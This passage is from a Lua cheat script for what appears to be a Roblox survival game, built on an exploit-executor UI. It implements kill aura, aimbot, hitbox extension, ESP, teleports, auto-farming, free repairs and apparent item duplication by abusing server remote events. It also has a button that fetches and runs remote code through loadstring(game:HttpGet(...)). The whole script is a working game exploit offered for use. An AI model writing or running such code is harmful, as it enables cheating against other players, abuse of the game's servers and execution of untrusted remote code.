                    else
                        Boxoutline.Visible = false
                        Box.Visible = false
                        Healthbaroutline.Visible = false
                        Healthbar.Visible = false
                    end
                end
            end)
        end
        for _, plr in pairs(Players:GetPlayers()) do
            if plr ~= LocalPlayer then
                EspOnPlayer(plr)
            end
        end
        if not ChrAddedFunc then
            ChrAddedFunc = Players.PlayerAdded:Connect(function(plr)
                if not getgenv().configs.PlayerEsp then
                    ChrAddedFunc:Disconnect()
                    ChrAddedFunc = nil
                end
                EspOnPlayer(plr)
            end)
        end
    end
end

--Sections and ui stuff
local MainSection = Main:CreateSection("Main")

MainSection:CreateToggle({
    Name = 'Remember Keybinds',
    Default = false,
    Flag = 'RememberConfigs',
    Callback = function(Value)
        return Value
    end
})

MainSection:CreateInteractable({
    Name = 'Infinite Yield',
    ActionText = 'Execute',
    Callback = function()
        loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source', true))()
    end
})

MainSection:CreateKeybind({
    Name = 'AutoPickup',
    Default = "X",
	Flag = 'AutoPickup',
	KeyPressed = AutoPickup,
})

MainSection:CreateToggle({
    Name = 'AutoPickup(toggle)',
	Default = false,
	Flag = 'AutoPickup(toggle)',
    Callback = function(Value)
        getgenv().configs.AutoPickup2 = Value
        AutoPickup2() 
    end
})

MainSection:CreateButton({
    Name = 'Steal any op loot on ground',
    Callback = function(Value)
        local function FindFunnyClosestItem()
            local closest
            local range = math.huge
            for _, funnyitem in pairs(Workspace:GetDescendants()) do
				if funnyitem:IsA("Model") then
					if string.find(funnyitem.Name:lower(), 'obsidian') or string.find(funnyitem.Name:lower(), 'staff') or string.find(funnyitem.Name:lower(), 'moonstone') or string.find(funnyitem.Name:lower(), 'lunar') or string.find(funnyitem.Name:lower(), 'zenyte') or string.find(funnyitem.Name:lower(), 'obsidian') or string.find(funnyitem.Name:lower(), 'diamond') or string.find(funnyitem.Name:lower(), 'obsidian') or string.find(funnyitem.Name:lower(), 'lucky') or string.find(funnyitem.Name:lower(), 'pumpkin') or string.find(funnyitem.Name:lower(), 'book') or string.find(funnyitem.Name:lower(), 'volcanic ore') then
						if not funnyitem:FindFirstChildOfClass('StringValue') and not funnyitem.Parent:FindFirstChildOfClass('Humanoid') and not string.find(funnyitem.Name:lower(), 'harvest') and not string.find(funnyitem.Name:lower(), 'wizard') and not string.find(funnyitem.Name:lower(), 'zenytes') and not string.find(funnyitem.Parent.Name:lower(), 'anvil') and not string.find(funnyitem.Name:lower(), 'pet') and not string.find(funnyitem.Name:lower(), 'cave') and not string.find(funnyitem.Name:lower(), 'rock') and not string.find(funnyitem.Name:lower(), 'stone') then
							if IsPlayerAlive(LocalPlayer) then
								local dist = (LocalPlayer.Character.HumanoidRootPart.Position - funnyitem:GetPivot().Position).magnitude
								if dist < range then
									range = dist
									closest = funnyitem
								end
							end
						end
					end
				end
            end
            return closest
        end
        if FindFunnyClosestItem() then
            local oldpos = LocalPlayer.Character.HumanoidRootPart.CFrame
            LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(FindFunnyClosestItem():GetPivot().Position)
            task.wait(0.2)
            AutoPickup()
            LocalPlayer.Character.HumanoidRootPart.CFrame = oldpos
        else
            MakeAtlasNotification('wah wah wahhh', 'noting good on da floor :(', 3)
        end
    end
})

local InstantRepairSection = Main:CreateSection('Instant repair free, click as many times as needed')

InstantRepairSection:CreateDropdown({
    Name = 'Instant Repair',
    DefaultItemSelected = '...',
    Options = {'MoonstoneSet', 'ObsidianSet', 'AllShields', 'AllSwords', 'AllBows', 'AllBooks', 'AllStaffs'},
    Callback = function(Value)
        local ClosestChest = GetClosestChest()
        if not ClosestChest then
            MakeAtlasNotification('Needs chest', 'Place any chest down!', 2.5)
            return
        end
        local set

        if Value == 'MoonstoneSet' then
            set = MoonstoneSet
        elseif Value == 'ObsidianSet' then
            set = ObsidianSet
        elseif Value == 'AllShields' then
            set = AllShields
        elseif Value == 'AllSwords' then
            set = AllSwords
        elseif Value == 'AllBows' then
            set = AllBows
        elseif Value == 'AllBooks' then
            set = AllBooks
        elseif Value == 'AllStaffs' then
            set = AllStaffs
        end
        
        for _, piece in pairs(set) do
            RemoteEvents['UpdateStorageChest']:FireServer(ClosestChest, true, piece)
            RemoteEvents['UpdateStorageChest']:FireServer(ClosestChest, false, piece)
        end
        MakeAtlasNotification('Repaired', 'Repaired '..Value, 1)
    end
})

local AnythingInChestSection = Main:CreateSection('Place Anything in(nearest) chest')

AnythingInChestSection:CreateDropdown({
    Name = 'Specific Chest Type',
    DefaultItemSelected = 'Any',
    Options = {'Any', 'Wood', 'Stone', 'Silver', 'Gold', 'Ruby', 'Diamond', 'Zenyte', 'Obsidian', 'Moonstone'},
    ItemSelecting = true,
    Callback = function(Value)
        getgenv().configs.ChestType = Value 
    end
})

AnythingInChestSection:CreateButton({
    Name = 'Store Item',
    Callback = function()
        local function GetClosestFilteredChest()
            local CheckPassiveOrNonPassive = Workspace:FindFirstChild("Replicators"):FindFirstChild('NonPassive') and 'NonPassive' or 'Passive'
	        local closest
	        local range = math.huge
            if IsPlayerAlive(LocalPlayer) then
                for _, chest in pairs(Workspace:WaitForChild("Replicators")[CheckPassiveOrNonPassive]:GetChildren()) do
                    if string.find(chest.Name:lower(), 'storage') and chest:FindFirstChildOfClass('MeshPart') then
                        if getgenv().configs.ChestType == 'Any' then
                            local dist = (LocalPlayer.Character:WaitForChild('HumanoidRootPart').Position - chest:FindFirstChildOfClass('MeshPart').Position).magnitude
                            if dist < range then
                                range = dist
                                closest = chest
                            end
                        else
                            if string.find(chest.Name:lower(), getgenv().configs.ChestType:lower()) then
                                local dist = (LocalPlayer.Character:WaitForChild('HumanoidRootPart').Position - chest:FindFirstChildOfClass('MeshPart').Position).magnitude
                                if dist < range then
                                    range = dist
                                    closest = chest
                                end
                            end
                        end
                    end
                end
            end
	        return closest
        end
        local GetFilteredChest = GetClosestFilteredChest()
        if not GetFilteredChest then
            MakeAtlasNotification('Needs chest', 'Place any chest down!', 2.5)
            return
        end
        for i=1, getgenv().AmountOfChestInserts do
            RemoteEvents['UpdateStorageChest']:FireServer(GetFilteredChest, true, SWITCHEDITEMSTABLE[getgenv().ItemToPutInChest])
        end
    end
})

getgenv().ChestItems = AnythingInChestSection:CreateDropdown({
    Name = 'Inventory Item',
    DefaultItemSelected = '...',
    Options = {'...'},
    ItemSelecting = true,
    Callback = function(Value)
        getgenv().ItemToPutInChest = Value 
    end
})

local ItemsToPutInChest = {};

for _, inv in pairs(MyInventory:GetChildren()) do
    if inv:IsA("ImageLabel") and inv.Name ~= 'Arrow' then
        table.insert(ItemsToPutInChest, inv.Name)
    end
end

table.sort(ItemsToPutInChest)

getgenv().ChestItems:Update(ItemsToPutInChest)

if not getgenv().InventoryCollecting then
    getgenv().InventoryCollecting = MyInventory.ChildAdded:Connect(function(item)
        ItemsToPutInChest = {}
		for _, inv in pairs(MyInventory:GetChildren()) do
			if inv:IsA("ImageLabel") and inv.Name ~= 'Arrow' then
				table.insert(ItemsToPutInChest, inv.Name)
			end
		end
        table.sort(ItemsToPutInChest)
        getgenv().ChestItems:Update(ItemsToPutInChest)
    end)
end

AnythingInChestSection:CreateSlider({
    Name = 'Amount of item',
    Min = 1,
	Max = 200,
	Default = 1,
	Digits = 0,
	Flag = 'AmountChestItem',
	Callback = function(Value)
		getgenv().AmountOfChestInserts = Value
	end 
})

local AutoEatSection = Main:CreateSection('Auto Eat')

AutoEatSection:CreateToggle({
    Name = 'Auto Eat',
    Default = false,
	Flag = 'AutoEat',
    Callback = function(Value)
        getgenv().configs.AutoEat = Value
        AutoEat()
    end
})
AutoEatSection:CreateDropdown({
    Name = 'Auto Eat Type',
    DefaultItemSelected = 'AFK',
    Options = {'AFK', 'War'},
    ItemSelecting = true,
    Callback = function(Value)
        getgenv().configs.EatingType = Value
    end
})

local MiscSection = Main:CreateSection('Misc')

MiscSection:CreateToggle({
    Name = 'Ctrl+Click tp',
    Default = false,
	Flag = 'CtrlTp',
    Callback = function(Value)
        getgenv().configs.ClickTp = Value
        ClickTp()
    end
})

MiscSection:CreateToggle({
    Name = 'Mine Aura',
    Default = false,
	Flag = 'MineAura',
        Callback = function(Value)
        getgenv().configs.MineAura = Value
        MineAura()
    end
})

MiscSection:CreateButton({
    Name = 'Resets character',
    Callback = function()
        if IsPlayerAlive(LocalPlayer) then
            local Respawn
            local oldpos = LocalPlayer.Character.HumanoidRootPart.Position
            LocalPlayer.Character.Humanoid.Health = 0
            Respawn = LocalPlayer.CharacterAdded:Connect(function(chr)
                chr:WaitForChild('HumanoidRootPart').CFrame = CFrame.new(oldpos)
                Respawn:Disconnect()
                return
            end)
        end
    end
})

MiscSection:CreateButton({
    Name = 'Render Map(Helpful for loading assets)',
    Callback = function()
        if IsPlayerAlive(LocalPlayer) then
            local oldpos = LocalPlayer.Character:WaitForChild('HumanoidRootPart').CFrame
            local function MakeTween(pos)
                return TweenService:Create(LocalPlayer.Character.HumanoidRootPart, TweenInfo.new(1.5, Enum.EasingStyle.Quad), {CFrame = CFrame.new(pos)})
            end
            local a = MakeTween(Vector3.new(-1812, 46, -7685))
            a:Play()
            a.Completed:Wait()
            local b = MakeTween(Vector3.new(-1838, 46, -3189))
            b:Play()
            b.Completed:Wait()
            local c =  MakeTween(Vector3.new(5825, 76, -3258))
            c:Play()
            c.Completed:Wait()
            local d =  MakeTween(Vector3.new(5330, 36, -7372))
            d:Play()
            d.Completed:Wait()
            local e =  MakeTween(Vector3.new(4782, 74, -5208))
            e:Play()
            e.Completed:Wait()
            local f =  MakeTween(Vector3.new(-152, 106, -4079))
            f:Play()
            f.Completed:Wait()
            LocalPlayer.Character:WaitForChild('HumanoidRootPart').CFrame = oldpos
        end
    end
})

MiscSection:CreateToggle({
    Name = 'Other Hacker Detector',
    Default = false,
	Flag = 'HackerDetector',
    Callback = function(Value)
        local function CheckTeleport(rootpart, initialpos)
            task.wait(0.2)
            if (rootpart.Position - initialpos).magnitude > 100 then
                return true
            end
        end
        local function CheaterDetector()
            _G.cooldown = 0
            local abs = math.abs
            local Reason = 'Unknown'
            while getgenv().configs.CheaterDetector do
                if getgenv().configs.CheaterDetector then
                    task.wait(_G.cooldown)
                    for _, plr in pairs(Players:GetPlayers()) do
                        if plr ~= LocalPlayer then
                            if IsPlayerAlive(plr) then
                                local oldpos = plr.Character.HumanoidRootPart.Position
                                local velocity = plr.Character.HumanoidRootPart.AssemblyLinearVelocity
                                local maxvelocity = {abs(velocity.X), abs(velocity.Y), abs(velocity.Z)}
                                local max = math.max(unpack(maxvelocity))
                                task.spawn(function()
                                    if CheckTeleport(plr.Character.HumanoidRootPart, plr.Character.HumanoidRootPart.Position) then
                                        Reason = 'Teleporting'
                                        MakeAtlasNotification('Suspicious Activity', plr.Name..' is looking suspicious, Reason: '..Reason, 3)
                                    end
                                    _G.cooldown = 0.5
                                end)
                                if plr.Character.Humanoid:GetState() == Enum.HumanoidStateType.PlatformStanding then
                                    Reason = 'Flying'
                                    MakeAtlasNotification('Suspicious Activity', plr.Name..' is looking suspicious, Reason: '..Reason, 3)
                                    _G.cooldown = 3
                                elseif plr.Character.Humanoid:GetState() == Enum.HumanoidStateType.Seated and max > 60 then
                                    Reason = 'Vehicle Fly/Speed'
                                    MakeAtlasNotification('Suspicious Activity', plr.Name..' is looking suspicious, Reason: '..Reason, 3)
                                    _G.cooldown = 1
                                elseif max > 80 and max ~= maxvelocity[2] then
                                    Reason = 'Excessive Speed'
                                    MakeAtlasNotification('Suspicious Activity', plr.Name..' is looking suspicious, Reason: '..Reason, 3)
                                    _G.cooldown = 1
                                elseif plr.Character.Humanoid.WalkSpeed > 24 then
                                    Reason = 'Speed'
                                    MakeAtlasNotification('Suspicious Activity', plr.Name..' is looking suspicious, Reason: '..Reason, 3)
                                    _G.cooldown = 1
                                elseif plr.Character.Humanoid.JumpPower > 80 then
                                    Reason = 'Jump Power'
                                    MakeAtlasNotification('Suspicious Activity', plr.Name..' is looking suspicious, Reason: '..Reason, 3)
                                    _G.cooldown = 1
                                end
                            end
                        end
                    end
                end
            end
        end
        getgenv().configs.CheaterDetector = Value
        CheaterDetector()
    end
})

local BumpUpMainSection = Main:CreateSection('')

local KillAuraSection = Combat:CreateSection('Kill Aura')

KillAuraSection:CreateToggle({
    Name = 'Kill Aura',
    Default = false,
    Flag = 'KillAura',
    Callback = function(Value)
        getgenv().configs.KillAura = Value
        KillAura()
    end
})

KillAuraSection:CreateTextBox({
    Name = 'Whitelist Person',
    DefaultText = '',
    PlaceholderText = 'Username here',
    ClearTextOnFocus = true,
    Flag = 'WhitelistPersonTextbox',
    Callback = function(args)
        if args == "" then return end
        for _, plr in pairs(Players:GetPlayers()) do
            if string.find(plr.Name:lower(), args:lower()) or string.find(plr.DisplayName:lower(), args:lower()) then
                table.insert(Whitelist_table, plr.Name)
                MakeAtlasNotification("Player added to whitelist", plr.Name .. ' was added to the whitelist table', 3)
                return
            end
        end
    end
})

KillAuraSection:CreateTextBox({
    Name = 'Remove Whitelisted Person',
    DefaultText = '',
    PlaceholderText = 'Username here',
    ClearTextOnFocus = true,
    Flag = 'BlacklistPersonTextbox',
    Callback = function(args)
        if args == "" then return end
        for _, plr in pairs(Players:GetPlayers()) do
            if string.find(plr.Name:lower(), args:lower()) or string.find(plr.DisplayName:lower(), args:lower()) then
                if table.find(Whitelist_table, plr.Name) then
                    table.remove(Whitelist_table, table.find(Whitelist_table, plr.Name))
                    MakeAtlasNotification("Player removed from whitelist", plr.Name .. ' was removed from the whitelist', 3)
                    return
                end
            end
        end
    end
})

local CloseCombatSection = Combat:CreateSection('Close Combat')

CloseCombatSection:CreateToggle({
    Name = 'Player Lock(Aimbot)',
    Default = false,
    Flag = 'PlayerLock',
    Callback = function(Value)
        getgenv().configs.PlayerLock = Value
        PlayerLock()
    end
})

CloseCombatSection:CreateToggle({
    Name = 'Auto Heal(Pumpkins)',
    Default = false,
    Flag = 'AutoHeal',
    Callback = function(Value)
        getgenv().configs.Pumpkins = Value
        Pumpkins()
    end
})

CloseCombatSection:CreateToggle({
    Name = 'Hitbox Extender   Bow only',
    Default = false,
    Flag = 'HitboxExtender',
    Callback = function(Value)
        getgenv().configs.Hitbox = Value
        Hitbox()
        if not getgenv().configs.Hitbox then
            for _, plr in pairs(Players:GetPlayers()) do
                if plr ~= LocalPlayer and IsPlayerAlive(plr) and plr.Character:FindFirstChild('Hitbox') then
                    plr.Character.Hitbox.Size = Vector3.new(4.9453125, 6.273651123046875, 2.0283203125)
                end
            end
        end
    end
})

CloseCombatSection:CreateSliderToggle({
	Name = "EscapeDeath(Slider = Time)",
	Min = 5,
	Max = 30,
    SliderDefault = 15,
	Digits = 0,
	ToggleDefault = false,
    SliderFlag = "EscapeDeathSlider",
	ToggleFlag = "EscapeDeathToggle",
	SliderCallback = function(Value) 
		TimeBetweenTps = Value
	end,
	ToggleCallback = function(Value)  
		getgenv().configs.SafeDeath = Value
        SafeDeath()
	end
})

local AdvancedKillAuraSection = Combat:CreateSection('Advanced Kill Aura')


AdvancedKillAuraSection:CreateTextBox({
    Name = 'Op KillAura Target',
    DefaultText = '',
    PlaceholderText = 'Username here',
    ClearTextOnFocus = true,
    Flag = 'OpKillAuraTarget',
    Callback = function(Value)
        if Value == "" then return end
        for _, plr in pairs(Players:GetPlayers()) do
            if string.find(plr.Name:lower(), Value:lower()) or string.find(plr.DisplayName:lower(), Value:lower()) then
                table.insert(OpKillAuraTable, 1, plr)
                MakeAtlasNotification("Entered "..plr.Name, 'You are going to target ' ..plr.Name .. ' >:)', 3)
                return
            end
        end
    end
})
AdvancedKillAuraSection:CreateSliderToggle({
	Name = "Op Kill Aura",
	Min = 2,
	Max = 3,
    SliderDefault = 3,
	Digits = 0,
	ToggleDefault = false,
    SliderFlag = "PredictionDistance",
	ToggleFlag = "OPKillAura",
	SliderCallback = function(Value) 
		getgenv().PredictAmount = Value
	end,
	ToggleCallback = function(Value)  
		getgenv().configs.OpKillAura = Value
        OpKillAura()
	end
})

AdvancedKillAuraSection:CreateToggle({
    Name = 'Toggle Predict',
    Default = false,
    Flag = 'TogglePredict',
    Callback = function(Value)
        getgenv().configs.PredictOpKillAura = Value
    end
})

local CombatMiscsSection = Combat:CreateSection('Miscs')

CombatMiscsSection:CreateToggle({
    Name = 'Mob Aura',
    Default = false,
    Flag = 'MobAura',
    Callback = function(Value)
        getgenv().configs.MobAura = Value
        MobAura()
    end
})

CombatMiscsSection:CreateKeybind({
    Name = 'Trap Player',
    Default = 'Minus',
    Flag = 'TrapPlayer',
    KeyPressed = TrapPlayer
})

CombatMiscsSection:CreateDropdown({
    Name = 'Trap Type',
    DefaultItemSelected = 'Stone Trap',
    Options = {'Stone Trap', 'Ruby Trap', 'Zenyte Trap'},
    ItemSelecting = true,
    Callback = function(Value)
       getgenv().configs.TrapType = Value 
    end
})

local TreeFarmSection = Farming:CreateSection('Tree Farm')

TreeFarmSection:CreateToggle({
	Name = 'Conifer Farm(equip any tool)',
	Default = false,
    Flag = 'ConiferFarm',
	Callback = function(Value)
		getgenv().configs.ConfierFarm = Value
		ConiferFarm()
	end
})

local BossFarmSettingSection = Farming:CreateSection('Boss Farm Settings')

BossFarmSettingSection:CreateToggle({
    Name = 'Auto repair Ob Club(50%)(place chest)',
    Default = false,
    Flag = 'AutoRepairClub',
    Callback = function(Value)
        getgenv().configs.AutoRepairClub = Value
       AutoRepairClub()
    end
})

BossFarmSettingSection:CreateToggle({
    Name = 'Use Soul Keys to farm bosses(inf farm)',
    Default = false,
    Flag = 'SoulKeyBossFarm',
    Callback = function(Value)
        getgenv().configs.UseSoulKeys = Value
    end
})

local BossFarmsSection = Farming:CreateSection('Boss Farms(Disables kill aura)')

BossFarmsSection:CreateToggle({
    Name = 'Obsidian Boss Farm',
    Default = false,
    Flag = 'ObsidianBossFarm',
    Callback = function(Value)
        getgenv().configs.ObsidianBoss = Value
       ObsidianBoss()
    end
})

BossFarmsSection:CreateToggle({
    Name = 'Zenyte/Lucky Boss Farm',
    Default = false,
    Flag = 'Zenyte/LuckyBoss Farm',
    Callback = function(Value)
        getgenv().configs.ZenLuckBoss = Value
       ZenLuckBoss()
    end
})

BossFarmsSection:CreateToggle({
    Name = 'Spirit Boss Aura',
    Default = false,
    Flag = 'SpiritBossFarm',
    Callback = function(Value)
        getgenv().configs.SpiritBoss = Value
       SpiritBoss()
    end
})

local NotAutoSection = Farming:CreateSection('NOT AUTO')

NotAutoSection:CreateToggle({
    Name = 'Lucky Slime Farm',
    Default = false,
    Flag = 'LuckySlimeFarm',
    Callback = function(Value)
        getgenv().configs.LuckySlime = Value
       LuckySlime()
    end
})

NotAutoSection:CreateToggle({
    Name = 'Evil Skeleton Farm',
    Default = false,
    Flag = 'EvilSkeletonFarm',
    Callback = function(Value)
        getgenv().configs.EvilSkeleton = Value
        EvilSkeleton()
    end
})

NotAutoSection:CreateToggle({
    Name = 'Ogre Farm',
    Default = false,
    Flag = 'OgreFarm',
    Callback = function(Value)
        getgenv().configs.Ogre = Value
       Ogre()
    end
})

NotAutoSection:CreateToggle({
    Name = 'Captain Squid Farm',
    Default = false,
    Flag = 'CaptainSquidFarm',
    Callback = function(Value)
        getgenv().configs.Squid = Value
        Squid()
    end
})

local BumpUpFarmSection = Farming:CreateSection('')

local EventsSection = Teleports:CreateSection('Events')

EventsSection:CreateButton({
    Name = 'Asteroid',
    Callback = function()
        if IsPlayerAlive(LocalPlayer) then
            if Workspace:FindFirstChild('Asteroid', true) then
                local AstPos = Workspace:FindFirstChild('Asteroid', true):GetPivot().Position
                local myroot = LocalPlayer.Character.HumanoidRootPart
                myroot.CFrame = CFrame.new(AstPos + Vector3.new(0, 35, 0))
            else
                MakeAtlasNotification('No Asteroids gangy', 'A sad sad day... I know :(', 3)
            end
        end
    end
})

EventsSection:CreateButton({
    Name = 'Lucky Slime',
    Callback = function()
        if IsPlayerAlive(LocalPlayer) then
            if Workspace:WaitForChild('Replicators'):FindFirstChild('Both'):FindFirstChild("Lucky Slime") then
                local slime = Workspace.Replicators.Both["Lucky Slime"]
                if slime:FindFirstChild('Humanoid') and slime:FindFirstChild('HumanoidRootPart') then
                    local slimepos = slime.HumanoidRootPart.Position
                    local myroot = LocalPlayer.Character.HumanoidRootPart
                    myroot.CFrame = CFrame.new(slimpos + Vector3.new(15, 0, 0))
                end
            else
                MakeAtlasNotification('No Lucky Slime gangy', 'A sad sad day... I know :(', 3)
            end
        end
    end
})

EventsSection:CreateButton({
    Name = 'Mega Candy Rock',
    Callback = function()
        if IsPlayerAlive(LocalPlayer) then
            local myroot = LocalPlayer.Character.HumanoidRootPart
            myroot.CFrame = CFrame.new(1944.84009, -6.88914394, -3933.60352, -0.775113165, 2.15758467e-10, 0.631822467, 5.72924108e-09, 1, 6.68708688e-09, -0.631822467, 8.80311202e-09, -0.775113165)
        end
    end
})

local TradersSection = Teleports:CreateSection('Traders')

TradersSection:CreateButton({
    Name = 'Resource Trader',
    Callback = function()
        if IsPlayerAlive(LocalPlayer) then
            local myroot = LocalPlayer.Character.HumanoidRootPart
            myroot.CFrame = CFrame.new(4288, 43, -4014)
        end
    end
})

TradersSection:CreateButton({
    Name = 'Armor/Weapon Trader',
    Callback = function()
        if IsPlayerAlive(LocalPlayer) then
            local myroot = LocalPlayer.Character.HumanoidRootPart
            myroot.CFrame = CFrame.new(427, 12, -3451)
        end
    end
})

TradersSection:CreateButton({
    Name = 'Ocean Trader',
    Callback = function()
        if IsPlayerAlive(LocalPlayer) then
            local myroot = LocalPlayer.Character.HumanoidRootPart
            myroot.CFrame = CFrame.new(1673, -290, -5659)
        end
    end
})

local VolcanoSection = Teleports:CreateSection('Volcano')

VolcanoSection:CreateButton({
    Name = 'Volcano',
    Callback = function()
        if IsPlayerAlive(LocalPlayer) then
            local myroot = LocalPlayer.Character.HumanoidRootPart
            myroot.CFrame = CFrame.new(-842, 63, -3603)
        end
    end
})

VolcanoSection:CreateButton({
    Name = 'Volanic Furnace',
    Callback = function()
        if IsPlayerAlive(LocalPlayer) then
            local myroot = LocalPlayer.Character.HumanoidRootPart
            myroot.CFrame = CFrame.new(2614, -454, -5579)
        end
    end
})

local CavesSection = Teleports:CreateSection('Caves')

CavesSection:CreateButton({
    Name = 'Zenyte Boss',
    Callback = function()
        if IsPlayerAlive(LocalPlayer) then
            local myroot = LocalPlayer.Character.HumanoidRootPart
            myroot.CFrame = CFrame.new(1741, -440, -4536)
        end
    end
})

CavesSection:CreateButton({
    Name = 'Spirit Boss',
    Callback = function()
        if IsPlayerAlive(LocalPlayer) then
            local myroot = LocalPlayer.Character.HumanoidRootPart
            myroot.CFrame = CFrame.new(1427, -293, -4959)
        end
    end
})

CavesSection:CreateButton({
    Name = 'Caves level 3',
    Callback = function()
        if IsPlayerAlive(LocalPlayer) then
            local myroot = LocalPlayer.Character.HumanoidRootPart
            myroot.CFrame = CFrame.new(1581, -502, -4649)
        end
    end
})

CavesSection:CreateButton({
    Name = 'Caves level 2',
    Callback = function()
        if IsPlayerAlive(LocalPlayer) then
            local myroot = LocalPlayer.Character.HumanoidRootPart
            myroot.CFrame = CFrame.new(1559, -347, -4635)
        end
    end
})

CavesSection:CreateButton({
    Name = 'Central Caves',
    Callback = function()
        if IsPlayerAlive(LocalPlayer) then
            local myroot = LocalPlayer.Character.HumanoidRootPart
            myroot.CFrame = CFrame.new(1532, -192, -4696)
        end
    end
})

local IslandSection = Teleports:CreateSection('Islands')

IslandSection:CreateButton({
    Name = 'Ice Biome',
    Callback = function()
        if IsPlayerAlive(LocalPlayer) then
            local myroot = LocalPlayer.Character.HumanoidRootPart
            myroot.CFrame = CFrame.new(1961, -2, -3973)
        end
    end
})

IslandSection:CreateButton({
    Name = 'Pet Island',
    Callback = function()
        if IsPlayerAlive(LocalPlayer) then
            local myroot = LocalPlayer.Character.HumanoidRootPart
            myroot.CFrame = CFrame.new(2889, 54, -6465)
        end
    end
})

IslandSection:CreateButton({
    Name = 'Banaenae Island',
    Callback = function()
        if IsPlayerAlive(LocalPlayer) then
            local myroot = LocalPlayer.Character.HumanoidRootPart
            myroot.CFrame = CFrame.new(3400, 13, -4467)
        end
    end
})

IslandSection:CreateButton({
    Name = 'Magic Island',
    Callback = function()
        if IsPlayerAlive(LocalPlayer) then
            local myroot = LocalPlayer.Character.HumanoidRootPart
            myroot.CFrame = CFrame.new(1292, 125, -7234)
        end
    end
})

IslandSection:CreateButton({
    Name = 'Starter Island',
    Callback = function()
        if IsPlayerAlive(LocalPlayer) then
            local myroot = LocalPlayer.Character.HumanoidRootPart
            myroot.CFrame = CFrame.new(-7507, 19, 7496)
        end
    end
})

IslandSection:CreateButton({
    Name = 'Secret Island',
    Callback = function()
        if IsPlayerAlive(LocalPlayer) then
            local myroot = LocalPlayer.Character.HumanoidRootPart
            myroot.CFrame = CFrame.new(7139, 72, 18673)
        end
    end
})

local LeaderboardSection = Teleports:CreateSection('Leaderboard')

LeaderboardSection:CreateButton({
    Name = 'Leaderboard Place',
    Callback = function()
        if IsPlayerAlive(LocalPlayer) then
            local myroot = LocalPlayer.Character.HumanoidRootPart
            myroot.CFrame = CFrame.new(5313, 4, -5508)
        end
    end
})

local BumpUpTeleportSection = Teleports:CreateSection('')

local ChestSpawningSection = Chests:CreateSection('Chest Spawning')

ChestSpawningSection:CreateButton({
    Name = 'Spawn Easy Treaure Chest(100 tokens)',
    Callback = function()
        RemoteEvents['BuyWorldEvent']:FireServer(1)
    end
})

ChestSpawningSection:CreateButton({
    Name = 'Spawn Medium Treaure Chest(450 tokens)',
    Callback = function()
        RemoteEvents['PetShop']:FireServer(200)
    end
})

ChestSpawningSection:CreateButton({
    Name = 'Spawn Hard Treaure Chest(1000 tokens)',
    Callback = function()
        RemoteEvents['BuyWorldEvent']:FireServer(3)
    end
})

local ChestOpeningSection = Chests:CreateSection('Chest Opening')

ChestOpeningSection:CreateButton({
    Name = 'Open Easy Chest',
    Callback = function()
        RemoteEvents['InventoryInteraction']:FireServer(166, "Open")
    end
})

ChestOpeningSection:CreateButton({
    Name = 'Open Medium Chest',
    Callback = function()
        RemoteEvents['InventoryInteraction']:FireServer(167, "Open")
    end
})

ChestOpeningSection:CreateButton({
    Name = 'Open Hard Chest',
    Callback = function()
        RemoteEvents['InventoryInteraction']:FireServer(168, "Open")
    end
})

local ChestFindingSection = Chests:CreateSection('Chest Finding')

ChestFindingSection:CreateButton({
    Name = 'Get Map Treaure',
    Callback = function()
        if IsPlayerAlive(LocalPlayer) then
            local oldpos = LocalPlayer.Character.HumanoidRootPart.CFrame
            local myroot = LocalPlayer.Character.HumanoidRootPart
            local function GetAllTreasure()
                for _, chest in pairs(Workspace:GetDescendants()) do
                    if string.find(chest.Name, 'Treasure Chest') then
                        local chestpos = chest:GetPivot().Position
                        repeat task.wait()
                            if chest.Parent then
                                myroot.CFrame = CFrame.new(chestpos + Vector3.new(0, 1, 0))
                                RemoteEvents['ItemInteracted']:FireServer(chest, "Pickup")
                            end
                        until not chest.Parent
                    end
                end
                myroot.CFrame = oldpos
            end
            if not GetAllTreasure() then
                MakeAtlasNotification('No chests spawned in :(', 'Try spawning one in! or..... wait.', 3)
            end
        end
    end
})

local ClueHelperSection = Chests:CreateSection('Clue Helper')

ClueHelperSection:CreateButton({
    Name = 'Clue is a text',
    Callback = function()
        local Steps = require(ReplicatedStorage:WaitForChild('References'):WaitForChild('SharedData'):WaitForChild('Clues'):WaitForChild('Steps'))
        local currentclue = LocalPlayer:WaitForChild('PlayerGui'):WaitForChild('Menus')["Clue Scroll"]:FindFirstChild('Content'):FindFirstChild('Riddle')
        local loadout = currentclue.Parent.Loadout.Text
        local cluetable = {};
        local CLUETYPE = nil;
        local loadoutsubbed = string.gsub(loadout, 'Must wear:  ', '')

        local function TrackClue()
            for _, riddle in pairs(Steps) do
                if riddle.Riddle ~= nil then
                    if currentclue.Text == riddle.Riddle then
                        CLUETYPE = riddle.Name
                    end
                end
            end
            if CLUETYPE ~= nil then
                for _, clue in pairs(Workspace:GetDescendants()) do
                    if clue.Name == CLUETYPE then
                        if clue:IsA('Model') then
                            if clue.PrimaryPart ~= nil then
                                table.insert(cluetable, clue.PrimaryPart.Position)
                            end
                        else
                            table.insert(cluetable, clue.Position)
                        end
                    end
                end
            end
            if cluetable[1] ~= nil then
                if IsPlayerAlive(LocalPlayer) then
                    LocalPlayer.Character:WaitForChild('HumanoidRootPart').CFrame = CFrame.new(cluetable[1] + Vector3.new(0, 20, 0))
                    return true
                end
            else
                MakeAtlasNotification("Clue not found", 'Your clue is not on the map', 3)
                return false
            end
        end
        if TrackClueImage() then
            MakeAtlasNotification('Must wear(if so):', loadoutsubbed, 7)
        end
    end
})

ClueHelperSection:CreateButton({
    Name = 'Clue is an image',
    Callback = function()
        local Steps = require(ReplicatedStorage:WaitForChild('References'):WaitForChild('SharedData'):WaitForChild('Clues'):WaitForChild('Steps'))
        local CurrentClueImage = LocalPlayer:WaitForChild('PlayerGui'):WaitForChild('Menus')["Clue Scroll"]:FindFirstChild('Content'):FindFirstChild('ImageLabel').Image
        local loadout = LocalPlayer:WaitForChild('PlayerGui'):WaitForChild('Menus')["Clue Scroll"]:FindFirstChild('Content'):FindFirstChild('Loadout').Text
        local IMAGES = {};
        local CLUELOCATION = nil;
        local loadoutsubbed = string.gsub(loadout, 'Must wear: ', '')
        
        function TrackClueImage()
            local function CheckImage()
                for _, image in pairs(Steps) do
                    if image.Image then
                        if CurrentClueImage == image.Image then
                            CLUELOCATION = image.Location
                            return true
                        end
                    end
                end
                return false
            end
            
            if CheckImage() then
                if IsPlayerAlive(LocalPlayer) then
                    LocalPlayer.Character:WaitForChild('HumanoidRootPart').CFrame = CFrame.new(CLUELOCATION + Vector3.new(0, 15, 0))
